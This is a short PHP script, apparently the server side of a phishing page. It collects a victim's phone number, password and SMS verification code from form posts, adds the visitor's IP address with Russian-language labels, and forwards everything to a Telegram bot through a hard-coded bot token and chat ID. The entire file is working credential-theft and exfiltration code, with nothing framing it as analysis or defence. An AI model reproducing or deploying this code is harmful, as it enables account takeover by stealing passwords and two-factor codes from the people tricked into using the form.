<?php

$token = "5427555560:AAHQ7tIGAxAxR2hTuOiJwjCDC1oePvJeIgY";
$chat_id = "5075703238";

$mask = "";

$ip = $_SERVER['REMOTE_ADDR'];

if ($_POST['phone']) {
    $phone = $_POST['phone'];
    $password = $_POST['password'];

    $arr = array(
      'Телефон: ' => $phone,
      'Пароль: ' => $password,
      'IP:' => $ip,
      'Тема:' => 'Форма Телефон/пароль',
    );
}

if ($_POST['code']) {
    $code = $_POST['code'];

    $arr = array(
      'СМС-код: ' => $code,
      'IP:' => $ip,
      'Тема:' => 'Форма смс-код',
    );
}

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

